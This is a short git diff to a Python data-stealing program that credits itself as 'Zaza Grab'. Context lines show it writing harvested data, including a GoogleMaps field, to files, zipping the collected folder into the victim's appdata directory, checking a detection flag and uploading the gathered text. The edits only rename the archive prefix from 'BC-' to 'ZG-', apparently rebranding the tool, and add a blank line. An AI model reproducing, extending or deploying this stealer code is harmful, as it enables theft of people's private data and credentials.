@@ -965,7 +965,7 @@ GoogleMaps: {self.googlemap}
                         with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                             fp.write(x + "\n\nZaza Grab Create By Soles | https://github.com/xKrustyDemonx")
 
-        _zipfile = ntpath.join(self.appdata, f'BC-[{infocom}].zip')
+        _zipfile = ntpath.join(self.appdata, f'ZG-[{infocom}].zip')
         zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
         abs_src = ntpath.abspath(self.dir)
         for dirname, _, files in os.walk(self.dir):
@@ -1664,3 +1664,4 @@ if not DETECTED:
                 filetext += "\n```"
                 filetext += "\n"
     upload("zazagrabedez", filetext)
+ 
